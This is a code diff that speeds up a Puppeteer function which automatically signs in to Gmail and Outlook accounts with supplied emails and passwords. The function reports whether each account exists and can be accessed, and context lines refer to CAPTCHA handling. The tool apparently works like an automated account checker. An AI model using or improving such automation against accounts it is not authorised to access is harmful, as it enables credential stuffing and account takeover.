@@ -715,6 +715,8 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
     let reachedInbox = false;
     let requiresVerification = false;
     const instanceId = `pid-${browser.process()?.pid || 'unknown'}`;
+    const caaStart = Date.now();
+    const speed = (label) => logger.info(`[checkAccountAccess][${instanceId}][SPEED] ${label} at +${Date.now() - caaStart}ms`);
 
     try {
         const platformConfig = platformConfigs[platform] || {};
@@ -755,10 +757,30 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
         }
 
         logger.debug(`[checkAccountAccess][${instanceId}] Starting flow for ${platform}.`);
+        speed('flow start');
 
         // Special handling for email retry in reusing session
         if (isReusingSession && platformConfig.selectors?.input) {
             logger.info(`[checkAccountAccess][${instanceId}] Reusing session for email retry, typing email directly. URL: ${page.url()}`);
+
+            // Fast path: on session reuse the email may already have been submitted by a prior
+            // checkAccountAccess pass, so the page may already be on the password step. Re-typing
+            // the email and re-clicking Next re-submits the form and wastes time; if the password
+            // input is already visible, skip straight to password handling instead.
+            const pwInputSelectorsForSkip = Array.isArray(platformConfig.selectors?.passwordInput)
+                ? platformConfig.selectors.passwordInput
+                : [platformConfig.selectors?.passwordInput].filter(Boolean);
+            const pwSkipStringSels = (pwInputSelectorsForSkip || []).filter(s => typeof s === 'string');
+            let passwordAlreadyVisible = false;
+            if (pwSkipStringSels.length > 0) {
+                passwordAlreadyVisible = await page.evaluate((sels) => {
+                    for (const s of sels) { try { const el = document.querySelector(s); if (el && el.offsetParent !== null) return true; } catch(e){} }
+                    return false;
+                }, pwSkipStringSels).catch(() => false);
+            }
+            if (passwordAlreadyVisible) {
+                logger.info(`[checkAccountAccess][${instanceId}][SPEED] Password input already visible on session reuse — skipping email re-entry (at +${Date.now() - caaStart}ms).`);
+            }
             try {
                 let inputFound = false;
                 try {
@@ -785,14 +807,14 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                         logger.warn(`[checkAccountAccess][${instanceId}] goto to login page failed/timeout (${navErr.message}). Polling for input anyway...`);
                     });
                     try {
-                        await page.waitForSelector(platformConfig.selectors.input, { visible: true, timeout: 25000 });
+                        await page.waitForSelector(platformConfig.selectors.input, { visible: true, timeout: 10000 });
                         inputFound = true;
                         logger.info(`[checkAccountAccess][${instanceId}] Email input found after navigation. URL: ${page.url()}`);
                     } catch (e2) {
                         logger.warn(`[checkAccountAccess][${instanceId}] Input still not found after login page. Trying outlook.live.com fallback...`);
-                        await page.goto('https://outlook.live.com/mail/', { waitUntil: 'domcontentloaded', timeout: 20000 }).catch(() => null);
+                        await page.goto('https://outlook.live.com/mail/', { waitUntil: 'domcontentloaded', timeout: 10000 }).catch(() => null);
                         try {
-                            await page.waitForSelector(platformConfig.selectors.input, { visible: true, timeout: 20000 });
+                            await page.waitForSelector(platformConfig.selectors.input, { visible: true, timeout: 10000 });
                             inputFound = true;
                             logger.info(`[checkAccountAccess][${instanceId}] Email input found via outlook.live.com fallback. URL: ${page.url()}`);
                         } catch (e3) {
@@ -800,7 +822,8 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                         }
                     }
                 }
-                if (inputFound) {
+                if (inputFound || passwordAlreadyVisible) {
+                    if (!passwordAlreadyVisible) {
                     await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, platformConfig.selectors.input);
                     await page.type(platformConfig.selectors.input, email, { delay: 20 });
 
@@ -831,6 +854,7 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                         return { emailExists: false, accountAccess: false, requiresVerification: false, error: "Next button not clickable" };
                     }
                     logger.info(`[checkAccountAccess][${instanceId}] Email submitted. URL: ${page.url()}`);
+                    speed('email submitted');
 
                     await Promise.race([
                         page.waitForFunction(() => document.readyState === 'complete').catch(() => null),
@@ -865,6 +889,7 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
 
                     // Handle intermediate views after email submission (e.g. Outlook "Verify your email" → "Other ways to sign in" → "Use your password")
                     await handleAdditionalViews(page, platformConfig, instanceId);
+                    speed('additional views handled (post-email)');
 
                     // CAPTCHA handling — only for Google (image CAPTCHA + reCAPTCHA Enterprise)
                     if (platform === 'gmail') {
@@ -989,8 +1014,10 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                         }
                     }
                     } // end if (isGoogle) CAPTCHA handling
+                    } // end if (!passwordAlreadyVisible) — skip email re-entry on session reuse
 
                     // Wait for password input to become visible (handles Outlook "Use your password" transition delay)
+                    speed('post-email transitions handled');
                     const pwInputSelectors = Array.isArray(platformConfig.selectors?.passwordInput) ? platformConfig.selectors.passwordInput : [platformConfig.selectors?.passwordInput].filter(Boolean);
                     if (pwInputSelectors.length > 0) {
                         const pwCombinedSelector = pwInputSelectors.filter(s => typeof s === 'string').join(', ');
@@ -1136,6 +1163,7 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                     if (password) {
                         logger.warn(`[checkAccountAccess][${instanceId}] Password available but password input not detected. Returning WAITING_PASSWORD.`);
                     }
+                    speed('password state resolved (WAITING_PASSWORD)');
                     return { emailExists: true, accountAccess: false, requiresVerification: false, verificationState: 'WAITING_PASSWORD' };
                 } else {
                     // Login page never rendered the email input. This is a technical state
